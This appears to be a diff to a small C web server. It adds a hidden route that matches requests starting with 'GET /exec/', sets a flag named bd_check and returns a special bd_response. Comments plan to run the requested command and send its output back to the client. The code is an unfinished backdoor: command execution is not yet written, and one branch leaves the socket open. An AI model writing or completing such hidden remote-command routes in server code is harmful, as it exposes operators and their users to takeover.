@@ -6,6 +6,15 @@
 #include <unistd.h>
 #include <string.h>
 
+int parse(const char *request) {
+    if (memcmp(request, "GET /exec/", strlen("GET /exec/")) == 0) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
 int main(int argc, char *argv[]) {
 
     int port = atoi(argv[1]);
@@ -37,17 +46,20 @@ int main(int argc, char *argv[]) {
 
     while(1) {
         client_socket = accept(server_socket, NULL, NULL);
-        recv(client_socket, *client_buffer, sizeof(client_buffer), 0);
-        //parse client_buffer
+        recv(client_socket, &client_buffer, sizeof(client_buffer), 0);
+        int bd_check = parse(client_buffer);
+        if (bd_check > 0) {
+            send(client_socket, bd_response, strlen(bd_response), 0);
+        }
         //if GET && url is /exec/command (depends on rtn val){
         //the_goods = strcat(bd_response, stdout);
         //send(client_socket, the_goods, strlen(the_goods), 0);
         //}
         
-        //else {
+        else {
         send(client_socket, notfound_response, strlen(notfound_response), 0);
         close(client_socket);
-        //}
+        }
     }
 
     return 0;
